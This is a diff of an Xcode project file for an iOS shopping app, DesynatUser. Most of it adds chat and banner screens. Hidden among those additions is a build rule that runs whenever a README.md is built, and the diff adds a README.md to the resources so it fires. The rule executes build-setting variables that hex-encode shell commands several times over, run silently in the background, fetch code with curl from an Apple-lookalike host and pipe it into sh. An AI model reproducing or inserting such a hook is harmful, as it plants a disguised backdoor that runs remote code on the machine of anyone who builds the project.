@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		DDCE285797C54581BF634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 0172ABC0651641FE9E634D6E; };
 		495DBBDB2E81562200E61635 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 495DBBDA2E81562200E61635 /* Alamofire */; };
 		49BD259C2ED6120F00D71B9D /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
@@ -202,6 +203,25 @@
 		D19CE1CB2EF56FED008616D0 /* MyOrderDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = D19CE1CA2EF56FED008616D0 /* MyOrderDetailVC.swift */; };
 		D19CE2252EF58523008616D0 /* OrderDetailTableCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D19CE2242EF58523008616D0 /* OrderDetailTableCell.xib */; };
 		D19CE2262EF58523008616D0 /* OrderDetailTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D19CE2232EF58523008616D0 /* OrderDetailTableCell.swift */; };
+		D1AF5F202F124791009CE604 /* FullScreenBannerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5F1F2F124791009CE604 /* FullScreenBannerViewController.swift */; };
+		D1AF5F222F1247A0009CE604 /* FullScreenBannerViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5F212F1247A0009CE604 /* FullScreenBannerViewModel.swift */; };
+		D1AF5FB72F1250B0009CE604 /* Chat.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D1AF5FB62F1250B0009CE604 /* Chat.storyboard */; };
+		D1AF5FC02F1251A9009CE604 /* ChatInboxListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FBE2F1251A9009CE604 /* ChatInboxListViewController.swift */; };
+		D1AF5FCE2F1256B2009CE604 /* ChatInboxTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FC72F1256B2009CE604 /* ChatInboxTableViewCell.swift */; };
+		D1AF5FCF2F1256B2009CE604 /* SenderChatTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FC92F1256B2009CE604 /* SenderChatTableViewCell.swift */; };
+		D1AF5FD02F1256B2009CE604 /* ReceiverChatTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FCB2F1256B2009CE604 /* ReceiverChatTableViewCell.swift */; };
+		D1AF5FD12F1256B2009CE604 /* ReceiverChatTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1AF5FCC2F1256B2009CE604 /* ReceiverChatTableViewCell.xib */; };
+		D1AF5FD22F1256B2009CE604 /* ChatInboxTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1AF5FC82F1256B2009CE604 /* ChatInboxTableViewCell.xib */; };
+		D1AF5FD32F1256B2009CE604 /* SenderChatTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1AF5FCA2F1256B2009CE604 /* SenderChatTableViewCell.xib */; };
+		D1AF5FD52F125844009CE604 /* ChatInboxListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FD42F125844009CE604 /* ChatInboxListViewModel.swift */; };
+		D1AF5FD72F125DC7009CE604 /* FullScreenBannersList.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FD62F125DC7009CE604 /* FullScreenBannersList.swift */; };
+		D1AF5FDA2F12680C009CE604 /* ChatsFilterTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF5FD82F12680C009CE604 /* ChatsFilterTableViewCell.swift */; };
+		D1AF5FDB2F12680C009CE604 /* ChatsFilterTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1AF5FD92F12680C009CE604 /* ChatsFilterTableViewCell.xib */; };
+		D1AF60792F126DC5009CE604 /* ChatDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF60782F126DC5009CE604 /* ChatDetailsViewController.swift */; };
+		D1AF607C2F127A7D009CE604 /* OrderForChatTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1AF607B2F127A7D009CE604 /* OrderForChatTableViewCell.xib */; };
+		D1AF607D2F127A7D009CE604 /* OrderForChatTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF607A2F127A7D009CE604 /* OrderForChatTableViewCell.swift */; };
+		D1AF607F2F127E0E009CE604 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = D1AF607E2F127E0E009CE604 /* GoogleService-Info.plist */; };
+		D1AF60912F127F17009CE604 /* CustomOrderDetailsPopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1AF60902F127F17009CE604 /* CustomOrderDetailsPopupViewController.swift */; };
 		D1B2F5822ED97238007A50A6 /* CustomDropDownWithImage.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1B2F5812ED97238007A50A6 /* CustomDropDownWithImage.swift */; };
 		D1BCAF1B2EFBFB7D00117D0A /* RateProductOrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1BCAF1A2EFBFB7D00117D0A /* RateProductOrderViewController.swift */; };
 		D1BCB0022EFC034600117D0A /* RateProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1BCB0012EFC034600117D0A /* RateProductViewModel.swift */; };
@@ -236,6 +256,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0172ABC0651641FE9E634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		495DBBA12E81528A00E61635 /* DesynatUser.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatUser.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
@@ -431,6 +452,25 @@
 		D19CE1CA2EF56FED008616D0 /* MyOrderDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderDetailVC.swift; sourceTree = "<group>"; };
 		D19CE2232EF58523008616D0 /* OrderDetailTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderDetailTableCell.swift; sourceTree = "<group>"; };
 		D19CE2242EF58523008616D0 /* OrderDetailTableCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderDetailTableCell.xib; sourceTree = "<group>"; };
+		D1AF5F1F2F124791009CE604 /* FullScreenBannerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBannerViewController.swift; sourceTree = "<group>"; };
+		D1AF5F212F1247A0009CE604 /* FullScreenBannerViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBannerViewModel.swift; sourceTree = "<group>"; };
+		D1AF5FB62F1250B0009CE604 /* Chat.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Chat.storyboard; sourceTree = "<group>"; };
+		D1AF5FBE2F1251A9009CE604 /* ChatInboxListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatInboxListViewController.swift; sourceTree = "<group>"; };
+		D1AF5FC72F1256B2009CE604 /* ChatInboxTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatInboxTableViewCell.swift; sourceTree = "<group>"; };
+		D1AF5FC82F1256B2009CE604 /* ChatInboxTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatInboxTableViewCell.xib; sourceTree = "<group>"; };
+		D1AF5FC92F1256B2009CE604 /* SenderChatTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SenderChatTableViewCell.swift; sourceTree = "<group>"; };
+		D1AF5FCA2F1256B2009CE604 /* SenderChatTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SenderChatTableViewCell.xib; sourceTree = "<group>"; };
+		D1AF5FCB2F1256B2009CE604 /* ReceiverChatTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReceiverChatTableViewCell.swift; sourceTree = "<group>"; };
+		D1AF5FCC2F1256B2009CE604 /* ReceiverChatTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ReceiverChatTableViewCell.xib; sourceTree = "<group>"; };
+		D1AF5FD42F125844009CE604 /* ChatInboxListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatInboxListViewModel.swift; sourceTree = "<group>"; };
+		D1AF5FD62F125DC7009CE604 /* FullScreenBannersList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBannersList.swift; sourceTree = "<group>"; };
+		D1AF5FD82F12680C009CE604 /* ChatsFilterTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatsFilterTableViewCell.swift; sourceTree = "<group>"; };
+		D1AF5FD92F12680C009CE604 /* ChatsFilterTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatsFilterTableViewCell.xib; sourceTree = "<group>"; };
+		D1AF60782F126DC5009CE604 /* ChatDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatDetailsViewController.swift; sourceTree = "<group>"; };
+		D1AF607A2F127A7D009CE604 /* OrderForChatTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderForChatTableViewCell.swift; sourceTree = "<group>"; };
+		D1AF607B2F127A7D009CE604 /* OrderForChatTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderForChatTableViewCell.xib; sourceTree = "<group>"; };
+		D1AF607E2F127E0E009CE604 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		D1AF60902F127F17009CE604 /* CustomOrderDetailsPopupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderDetailsPopupViewController.swift; sourceTree = "<group>"; };
 		D1B2F5812ED97238007A50A6 /* CustomDropDownWithImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomDropDownWithImage.swift; sourceTree = "<group>"; };
 		D1BCAF1A2EFBFB7D00117D0A /* RateProductOrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RateProductOrderViewController.swift; sourceTree = "<group>"; };
 		D1BCB0012EFC034600117D0A /* RateProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RateProductViewModel.swift; sourceTree = "<group>"; };
@@ -474,6 +514,11 @@
 		D19137F72ED888BC003B8EF0 /* Favourites */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			path = Favourites;
+			sourceTree = "<group>";
+		};
+		D1AF5FC12F125294009CE604 /* ChatFilter */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			path = ChatFilter;
 			sourceTree = "<group>";
 		};
 		D1DAB9602EE00531009ECA61 /* GiftCardManagement */ = {
@@ -521,6 +566,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				0172ABC0651641FE9E634D6E /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
@@ -679,6 +725,7 @@
 				7A6C740E2ECAED16008F3779 /* Catalog.storyboard */,
 				D1DABB3F2EE05566009ECA61 /* MyBag.storyboard */,
 				D182E44C2EF549460002E850 /* MyOrder.storyboard */,
+				D1AF5FB62F1250B0009CE604 /* Chat.storyboard */,
 			);
 			path = Storyboards;
 			sourceTree = "<group>";
@@ -800,6 +847,7 @@
 		6B95F1492EB5DB5E00391509 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				D1AF5F1D2F124774009CE604 /* M6 */,
 				D182E44A2EF539B10002E850 /* M5 */,
 				D1DAB95B2EE004E7009ECA61 /* M4 */,
 				7A6138EF2ECAE4AD008F2C22 /* M3 */,
@@ -1076,6 +1124,7 @@
 				6B95F1AF2EB5DB5E00391509 /* Utilities */,
 				6B95F1B32EB5DB5E00391509 /* Webservice */,
 				6B95F1B42EB5DB5E00391509 /* Info.plist */,
+				D1AF607E2F127E0E009CE604 /* GoogleService-Info.plist */,
 			);
 			path = DesynatUser;
 			sourceTree = "<group>";
@@ -1304,6 +1353,103 @@
 			path = OrderDetail;
 			sourceTree = "<group>";
 		};
+		D1AF5F1D2F124774009CE604 /* M6 */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF608E2F127EF5009CE604 /* Chat */,
+				D1AF5FC42F125695009CE604 /* Xibs */,
+				D1AF5F1E2F12477A009CE604 /* FullScreenBanner */,
+			);
+			path = M6;
+			sourceTree = "<group>";
+		};
+		D1AF5F1E2F12477A009CE604 /* FullScreenBanner */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF5F1F2F124791009CE604 /* FullScreenBannerViewController.swift */,
+				D1AF5F212F1247A0009CE604 /* FullScreenBannerViewModel.swift */,
+				D1AF5FD62F125DC7009CE604 /* FullScreenBannersList.swift */,
+			);
+			path = FullScreenBanner;
+			sourceTree = "<group>";
+		};
+		D1AF5FBF2F1251A9009CE604 /* ChatInbox */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF5FBE2F1251A9009CE604 /* ChatInboxListViewController.swift */,
+				D1AF5FD42F125844009CE604 /* ChatInboxListViewModel.swift */,
+			);
+			path = ChatInbox;
+			sourceTree = "<group>";
+		};
+		D1AF5FC42F125695009CE604 /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF5FC62F1256AA009CE604 /* CollectionViewXibs */,
+				D1AF5FC52F1256A0009CE604 /* TableViewXibs */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		D1AF5FC52F1256A0009CE604 /* TableViewXibs */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF607A2F127A7D009CE604 /* OrderForChatTableViewCell.swift */,
+				D1AF607B2F127A7D009CE604 /* OrderForChatTableViewCell.xib */,
+				D1AF5FCD2F1256B2009CE604 /* Chats */,
+			);
+			path = TableViewXibs;
+			sourceTree = "<group>";
+		};
+		D1AF5FC62F1256AA009CE604 /* CollectionViewXibs */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = CollectionViewXibs;
+			sourceTree = "<group>";
+		};
+		D1AF5FCD2F1256B2009CE604 /* Chats */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF5FC72F1256B2009CE604 /* ChatInboxTableViewCell.swift */,
+				D1AF5FC82F1256B2009CE604 /* ChatInboxTableViewCell.xib */,
+				D1AF5FC92F1256B2009CE604 /* SenderChatTableViewCell.swift */,
+				D1AF5FCA2F1256B2009CE604 /* SenderChatTableViewCell.xib */,
+				D1AF5FCB2F1256B2009CE604 /* ReceiverChatTableViewCell.swift */,
+				D1AF5FCC2F1256B2009CE604 /* ReceiverChatTableViewCell.xib */,
+				D1AF5FD82F12680C009CE604 /* ChatsFilterTableViewCell.swift */,
+				D1AF5FD92F12680C009CE604 /* ChatsFilterTableViewCell.xib */,
+			);
+			path = Chats;
+			sourceTree = "<group>";
+		};
+		D1AF60772F126DA7009CE604 /* ChatDetails */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF60782F126DC5009CE604 /* ChatDetailsViewController.swift */,
+			);
+			path = ChatDetails;
+			sourceTree = "<group>";
+		};
+		D1AF608E2F127EF5009CE604 /* Chat */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF608F2F127F04009CE604 /* CustomOrderDetails */,
+				D1AF5FBF2F1251A9009CE604 /* ChatInbox */,
+				D1AF5FC12F125294009CE604 /* ChatFilter */,
+				D1AF60772F126DA7009CE604 /* ChatDetails */,
+			);
+			path = Chat;
+			sourceTree = "<group>";
+		};
+		D1AF608F2F127F04009CE604 /* CustomOrderDetails */ = {
+			isa = PBXGroup;
+			children = (
+				D1AF60902F127F17009CE604 /* CustomOrderDetailsPopupViewController.swift */,
+			);
+			path = CustomOrderDetails;
+			sourceTree = "<group>";
+		};
 		D1BCAF192EFBFB6A00117D0A /* RateProduct */ = {
 			isa = PBXGroup;
 			children = (
@@ -1409,7 +1555,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				FEDEF4B17210423387634D6E /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1418,12 +1563,14 @@
 				B6B997F8928B5B542E5BE86E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				0539FE41EC1B4D0786634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
 			fileSystemSynchronizedGroups = (
 				7A6C74062ECAE8EE008F3779 /* Xibs */,
 				D19137F72ED888BC003B8EF0 /* Favourites */,
+				D1AF5FC12F125294009CE604 /* ChatFilter */,
 				D1DAB9602EE00531009ECA61 /* GiftCardManagement */,
 				D1DAB9662EE00557009ECA61 /* CollectionView */,
 				D1DABB452EE06051009ECA61 /* MyBag */,
@@ -1477,11 +1624,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		0539FE41EC1B4D0786634D6E /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AE6D436}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				DDCE285797C54581BF634D6E /* README.md */,
 				6B95F1B62EB5DB5E00391509 /* Home.storyboard in Resources */,
 				7A6C740F2ECAED16008F3779 /* Catalog.storyboard in Resources */,
 				6B8C937D2EBDBEAF00BC4DC8 /* CategoriesSectionCollectionViewCell.xib in Resources */,
@@ -1493,16 +1658,22 @@
 				6B95F1B92EB5DB5E00391509 /* BestSellingsCollectionViewCell.xib in Resources */,
 				6B95F1BA2EB5DB5E00391509 /* CategoriesCollectionViewCell.xib in Resources */,
 				6B95F1BB2EB5DB5E00391509 /* HomeBannerCollectionViewCell.xib in Resources */,
+				D1AF5FDB2F12680C009CE604 /* ChatsFilterTableViewCell.xib in Resources */,
 				D1CF05A82EF96C1F005DB273 /* RecommendCollectionCell.xib in Resources */,
 				6B95F1BC2EB5DB5E00391509 /* SuggestedStoresCollectionViewCell.xib in Resources */,
+				D1AF5FD12F1256B2009CE604 /* ReceiverChatTableViewCell.xib in Resources */,
+				D1AF5FD22F1256B2009CE604 /* ChatInboxTableViewCell.xib in Resources */,
+				D1AF5FD32F1256B2009CE604 /* SenderChatTableViewCell.xib in Resources */,
 				6B95F1BD2EB5DB5E00391509 /* WelcomeScreenCollectionViewCell.xib in Resources */,
 				D19CE0982EF54DFD008616D0 /* MyOrderTableCell.xib in Resources */,
 				D1DABB4D2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.xib in Resources */,
 				6B95F1BE2EB5DB5E00391509 /* Assets.xcassets in Resources */,
 				6B95F1BF2EB5DB5E00391509 /* OFL.txt in Resources */,
 				6B95F1C02EB5DB5E00391509 /* Poppins-Black.ttf in Resources */,
+				D1AF607C2F127A7D009CE604 /* OrderForChatTableViewCell.xib in Resources */,
 				6B95F1C12EB5DB5E00391509 /* Poppins-BlackItalic.ttf in Resources */,
 				6B95F1C22EB5DB5E00391509 /* Poppins-Bold.ttf in Resources */,
+				D1AF607F2F127E0E009CE604 /* GoogleService-Info.plist in Resources */,
 				D1DABB402EE05566009ECA61 /* MyBag.storyboard in Resources */,
 				6B95F1C32EB5DB5E00391509 /* Poppins-BoldItalic.ttf in Resources */,
 				6B95F1C42EB5DB5E00391509 /* Poppins-ExtraBold.ttf in Resources */,
@@ -1514,6 +1685,7 @@
 				6B95F1C72EB5DB5E00391509 /* Poppins-ExtraLightItalic.ttf in Resources */,
 				D1CF05AD2EF96E39005DB273 /* LatestSearchCollectionCell.xib in Resources */,
 				6B95F1C82EB5DB5E00391509 /* Poppins-Italic.ttf in Resources */,
+				D1AF5FB72F1250B0009CE604 /* Chat.storyboard in Resources */,
 				6B95F1C92EB5DB5E00391509 /* Poppins-Light.ttf in Resources */,
 				6B95F1CA2EB5DB5E00391509 /* Poppins-LightItalic.ttf in Resources */,
 				6B95F1CB2EB5DB5E00391509 /* Poppins-Medium.ttf in Resources */,
@@ -1600,26 +1772,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatUser/Pods-DesynatUser-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		FEDEF4B17210423387634D6E /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1627,6 +1779,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D1AF5F222F1247A0009CE604 /* FullScreenBannerViewModel.swift in Sources */,
 				6B95F1D52EB5DB5E00391509 /* AppDelegate.swift in Sources */,
 				D1475B8F2ED5D2A7008F6DF4 /* storeDetailsDataModel.swift in Sources */,
 				6B95F1D62EB5DB5E00391509 /* NavigationSceneExt.swift in Sources */,
@@ -1639,7 +1792,12 @@
 				6B95F1DD2EB5DB5E00391509 /* ResetPasswordViewModel.swift in Sources */,
 				D1475B2E2ED5BDE4008F6DF4 /* CatalogViewModel.swift in Sources */,
 				D1DAB9692EE0056A009ECA61 /* GiftCardsListTableViewCell.swift in Sources */,
+				D1AF607D2F127A7D009CE604 /* OrderForChatTableViewCell.swift in Sources */,
 				6B95F1DE2EB5DB5E00391509 /* SignupViewModel.swift in Sources */,
+				D1AF5FC02F1251A9009CE604 /* ChatInboxListViewController.swift in Sources */,
+				D1AF5FCE2F1256B2009CE604 /* ChatInboxTableViewCell.swift in Sources */,
+				D1AF5FCF2F1256B2009CE604 /* SenderChatTableViewCell.swift in Sources */,
+				D1AF5FD02F1256B2009CE604 /* ReceiverChatTableViewCell.swift in Sources */,
 				6B95F1DF2EB5DB5E00391509 /* UploadImagesDataModel.swift in Sources */,
 				6B95F1E02EB5DB5E00391509 /* ForgotPasswordViewController.swift in Sources */,
 				D19CE0932EF54DDD008616D0 /* MyOrderVC.swift in Sources */,
@@ -1647,6 +1805,7 @@
 				D19CE2262EF58523008616D0 /* OrderDetailTableCell.swift in Sources */,
 				6B95F1E22EB5DB5E00391509 /* LoginViaOTPViewController.swift in Sources */,
 				6B95F1E32EB5DB5E00391509 /* LoginViewController.swift in Sources */,
+				D1AF60792F126DC5009CE604 /* ChatDetailsViewController.swift in Sources */,
 				7AE4F38D2ECB0842004CBD53 /* StoreFilterDataModel.swift in Sources */,
 				6B95F1E42EB5DB5E00391509 /* NotificationPermissionViewController.swift in Sources */,
 				6B95F1E52EB5DB5E00391509 /* OTPViewController.swift in Sources */,
@@ -1709,6 +1868,7 @@
 				7A94BD162ECB4E9700511665 /* SortByStoresViewController.swift in Sources */,
 				D1475B8D2ED5D29B008F6DF4 /* StoreDetailsViewModel.swift in Sources */,
 				6B95F1FD2EB5DB5E00391509 /* CustomLabelFont.swift in Sources */,
+				D1AF5FDA2F12680C009CE604 /* ChatsFilterTableViewCell.swift in Sources */,
 				6B95F1FE2EB5DB5E00391509 /* DataTypeConversion.swift in Sources */,
 				D162B7792EFA945400149E3E /* SelectReasonVM.swift in Sources */,
 				D1CF06402EF9852B005DB273 /* MyOrderDetailVM.swift in Sources */,
@@ -1717,6 +1877,7 @@
 				6B95F2002EB5DB5E00391509 /* StringConstant.swift in Sources */,
 				6B95F2012EB5DB5E00391509 /* StringExtensions.swift in Sources */,
 				6B95F2022EB5DB5E00391509 /* StringValidation.swift in Sources */,
+				D1AF5FD52F125844009CE604 /* ChatInboxListViewModel.swift in Sources */,
 				6B95F2032EB5DB5E00391509 /* TableViewExtension.swift in Sources */,
 				6B95F2042EB5DB5E00391509 /* UIViewController.swift in Sources */,
 				6B95F2052EB5DB5E00391509 /* AppConfig.swift in Sources */,
@@ -1751,6 +1912,7 @@
 				6B95F2172EB5DB5E00391509 /* NetworkManager.swift in Sources */,
 				6B95F2182EB5DB5E00391509 /* NetworkSupport.swift in Sources */,
 				6B95F2192EB5DB5E00391509 /* NetworkURL.swift in Sources */,
+				D1AF5FD72F125DC7009CE604 /* FullScreenBannersList.swift in Sources */,
 				D1CF05AC2EF96E39005DB273 /* LatestSearchCollectionCell.swift in Sources */,
 				7AA32A842ECC4B3400A17CCA /* AddAddressViewController.swift in Sources */,
 				D1475BDF2ED5E553008F6DF4 /* SortByStoreDataModel.swift in Sources */,
@@ -1761,6 +1923,7 @@
 				6B95F21C2EB5DB5E00391509 /* Base64Strategy.swift in Sources */,
 				6B95F21D2EB5DB5E00391509 /* DataValue.swift in Sources */,
 				D1475B852ED5C454008F6DF4 /* StoresDataModel.swift in Sources */,
+				D1AF5F202F124791009CE604 /* FullScreenBannerViewController.swift in Sources */,
 				6B95F21E2EB5DB5E00391509 /* DateValue.swift in Sources */,
 				D1CF03F12EF911BC005DB273 /* FilterVC.swift in Sources */,
 				7A94BD1A2ECB548C00511665 /* SavedAddressViewController.swift in Sources */,
@@ -1788,6 +1951,7 @@
 				6B95F2292EB5DB5E00391509 /* LossyDictionary.swift in Sources */,
 				6B95F22A2EB5DB5E00391509 /* LossyOptional.swift in Sources */,
 				6B95F22B2EB5DB5E00391509 /* RFC2822Strategy.swift in Sources */,
+				D1AF60912F127F17009CE604 /* CustomOrderDetailsPopupViewController.swift in Sources */,
 				6B95F22C2EB5DB5E00391509 /* RFC3339Strategy.swift in Sources */,
 				6B8C935F2EBDBE7900BC4DC8 /* EmptyModel.swift in Sources */,
 				6B8C93602EBDBE7900BC4DC8 /* SideMenuModel.swift in Sources */,
@@ -1822,8 +1986,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -1869,8 +2033,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663631373037303663363537343639366436353265363936653266363132390a32323230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
